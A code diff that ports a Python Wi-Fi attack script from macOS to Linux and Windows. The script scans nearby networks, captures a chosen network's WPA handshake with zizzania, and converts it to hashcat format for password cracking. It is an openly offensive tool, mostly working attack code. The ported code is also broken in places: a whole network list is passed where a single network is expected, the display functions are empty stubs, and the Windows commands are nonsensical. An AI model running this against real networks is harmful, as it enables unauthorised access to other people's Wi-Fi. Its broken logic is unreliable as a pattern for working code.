@@ -1,12 +1,42 @@
 import subprocess
 import argparse
 import re
+import platform
 from prettytable import PrettyTable
 from tabulate import tabulate
 from os.path import expanduser
 from pyfiglet import Figlet
 
-airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
+# Platform specific configurations
+PLATFORM = platform.system().lower()
+
+class PlatformConfig:
+    def __init__(self):
+        if PLATFORM == "darwin":  # macOS
+            self.airport = '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport'
+            self.scan_cmd = ['sudo', self.airport, '-s']
+            self.channel_cmd = lambda ch: ['sudo', self.airport, '-c' + ch]
+            self.reset_cmd = ['sudo', self.airport, '-z']
+            self.get_interface_cmd = ['networksetup', '-listallhardwareports']
+            self.interface_parser = lambda output: output.split('\n')[output.split('\n').index('Hardware Port: Wi-Fi') + 1].split(': ')[1]
+        
+        elif PLATFORM == "linux":  # Linux/Debian
+            self.airport = 'iwlist'
+            self.scan_cmd = ['sudo', 'iwlist', 'scanning']
+            self.channel_cmd = lambda ch: ['sudo', 'iwconfig', 'wlan0', 'channel', ch]
+            self.reset_cmd = ['sudo', 'service', 'networking', 'restart']
+            self.get_interface_cmd = ['iwconfig']
+            self.interface_parser = lambda output: [line.split()[0] for line in output.split('\n') if 'IEEE 802.11' in line][0]
+        
+        elif PLATFORM == "windows":  # Windows
+            self.airport = 'netsh'
+            self.scan_cmd = ['netsh', 'wlan', 'show', 'networks', 'mode=Bssid']
+            self.channel_cmd = lambda ch: ['netsh', 'wlan', 'connect', 'name=*']  # Windows can't set channel directly
+            self.reset_cmd = ['netsh', 'wlan', 'disconnect']
+            self.get_interface_cmd = ['netsh', 'wlan', 'show', 'interfaces']
+            self.interface_parser = lambda output: re.search(r"Name\s+:\s+(.+)\n", output).group(1)
+
+config = PlatformConfig()
 
 parser = argparse.ArgumentParser()
 parser.add_argument('-w')
@@ -21,24 +51,96 @@ args = parser.parse_args()
 
 def scan_networks():
     print('Scanning for networks...\n')
+    
+    try:
+        if PLATFORM == "windows":
+            scan = subprocess.run(config.scan_cmd, capture_output=True, text=True)
+            networks = parse_windows_networks(scan.stdout)
+        elif PLATFORM == "linux":
+            scan = subprocess.run(config.scan_cmd, capture_output=True, text=True)
+            networks = parse_linux_networks(scan.stdout)
+            print(networks)
+        else:  # macOS - keep original parsing
+            scan = subprocess.run(config.scan_cmd, stdout=subprocess.PIPE)
+            scan = scan.stdout.decode('utf-8').split('\n')
+            networks = parse_macos_networks(scan)
+            
+        display_networks(networks)
+        return handle_network_selection(networks)
+            
+    except subprocess.CalledProcessError as e:
+        print(f"Error scanning networks: {e}")
+        return None
 
-    scan = subprocess.run(['sudo', airport, '-s'], stdout=subprocess.PIPE)
-    scan = scan.stdout.decode('utf-8').split('\n')
-    count = len(scan) - 1
-    scan = [o.split() for o in scan]
+def parse_windows_networks(output):
+    networks = {}
+    current_network = {}
+    index = 1
+    
+    for line in output.split('\n'):
+        if "SSID" in line and "BSSID" not in line:
+            if current_network:
+                networks[index] = current_network.copy()
+                index += 1
+                current_network = {}
+            current_network['ssid'] = line.split(': ')[1].strip()
+        elif "BSSID" in line:
+            current_network['bssid'] = line.split(': ')[1].strip()
+        elif "Signal" in line:
+            current_network['rssi'] = line.split(': ')[1].strip()
+        elif "Channel" in line:
+            current_network['channel'] = line.split(': ')[1].strip()
+        elif "Authentication" in line:
+            current_network['security'] = line.split(': ')[1].strip()
+    
+    if current_network:
+        networks[index] = current_network
+    
+    return networks
+
+def parse_linux_networks(output):
+    networks = {}
+    index = 1
+    
+    cells = output.split('Cell ')
+    for cell in cells[1:]:  # Skip first empty element
+        lines = cell.split('\n')
+        network = {}
+        
+        for line in lines:
+            if "ESSID" in line:
+                network['ssid'] = line.split(':')[1].strip().strip('"')
+            elif "Address" in line:
+                network['bssid'] = line.split('Address:')[1].strip()
+            elif "Channel" in line:
+                network['channel'] = line.split(':')[1].strip()
+            elif "Quality" in line:
+                network['rssi'] = line.split('=')[1].split()[0]
+            elif "Encryption" in line:
+                network['security'] = line.split(':')[1].strip()
+        
+        if network:
+            networks[index] = network
+            index += 1
+    
+    return networks
+
+def parse_macos_networks(scan_output):
+    networks = {}
+    count = len(scan_output) - 1
+    scan_output = [o.split() for o in scan_output]
 
     list = PrettyTable(['Number', 'Name', 'BSSID', 'RSSI', 'Channel', 'Security'])
-    networks = {}
     for i in range(1, count):
-        bssid = re.search('([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})', ' '.join(scan[i])).group(0)
-        bindex = scan[i].index(bssid)
+        bssid = re.search('([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})', ' '.join(scan_output[i])).group(0)
+        bindex = scan_output[i].index(bssid)
 
         network = {}
-        network['ssid'] = ' '.join(scan[i][0:bindex])
+        network['ssid'] = ' '.join(scan_output[i][0:bindex])
         network['bssid'] = bssid
-        network['rssi'] = scan[i][bindex + 1]
-        network['channel'] = scan[i][bindex + 2].split(',')[0]
-        network['security'] = scan[i][bindex + 5].split('(')[0]
+        network['rssi'] = scan_output[i][bindex + 1]
+        network['channel'] = scan_output[i][bindex + 2].split(',')[0]
+        network['security'] = scan_output[i][bindex + 5].split('(')[0]
 
         networks[i] = network
         list.add_row([i, network['ssid'], network['bssid'], network['rssi'], network['channel'], network['security']])
@@ -50,28 +152,53 @@ def scan_networks():
         scan_networks()
     else:
         x = int(x)
-    capture_network(networks[x]['bssid'], networks[x]['ssid'], networks[x]['channel'])
+    return networks[x]
 
+def display_networks(networks):
+    if PLATFORM == "windows":
+        # Windows-specific display logic if needed
+        pass
+    elif PLATFORM == "linux":
+        # Linux-specific display logic if needed
+        pass
+    else:
+        # Default (macOS) display logic
+        pass
+
+def handle_network_selection(selected_network):
+    bssid = selected_network['bssid']
+    ssid = selected_network['ssid']
+    channel = selected_network['channel']
+    capture_network(bssid, ssid, channel)
 
 def capture_network(bssid, ssid, channel):
-    subprocess.run(['sudo', airport, '-z'])
-    subprocess.run(['sudo', airport, '-c' + channel])
+    subprocess.run(config.reset_cmd)
+    subprocess.run(config.channel_cmd(channel))
 
     if args.i is None:
-        iface = subprocess.run(['networksetup', '-listallhardwareports'], stdout=subprocess.PIPE)
-        iface = iface.stdout.decode('utf-8').split('\n')
-        iface = iface[iface.index('Hardware Port: Wi-Fi') + 1].split(': ')[1]
+        iface_output = subprocess.run(config.get_interface_cmd, capture_output=True, text=True)
+        iface = config.interface_parser(iface_output.stdout)
     else:
         iface = args.i
 
-    print('\nInitiating zizzania to capture handshake...\n')
-
-    subprocess.run(['sudo', expanduser('~') + '/zizzania/src/zizzania', '-i', iface, '-b', bssid, '-w', str(ssid)+'.pcap', '-q'] + ['-n'] * args.d)
-
-    subprocess.run(['hcxpcapngtool', '-o', str(ssid)+'.hc22000', str(ssid)+'.pcap'], stdout=subprocess.PIPE)
-
+    print('\nInitiating capture to get handshake...\n')
+    
+    # Use platform-specific capture tools
+    if PLATFORM == "windows":
+        capture_tool = "dumpcap"  # Windows alternative
+    else:
+        capture_tool = expanduser('~') + '/zizzania/src/zizzania'
+    
+    capture_cmd = ['sudo', capture_tool, '-i', iface, '-w', f'{ssid}.pcap']
+    if PLATFORM != "windows":
+        capture_cmd.extend(['-b', bssid, '-q'] + ['-n'] * args.d)
+    
+    subprocess.run(capture_cmd)
+    
+    # Convert capture to hashcat format
+    subprocess.run(['hcxpcapngtool', '-o', f'{ssid}.hc22000', f'{ssid}.pcap'], stdout=subprocess.PIPE)
+    
     print('\nHandshake ready for cracking...\n')
-
     crack_capture(ssid)
 
 
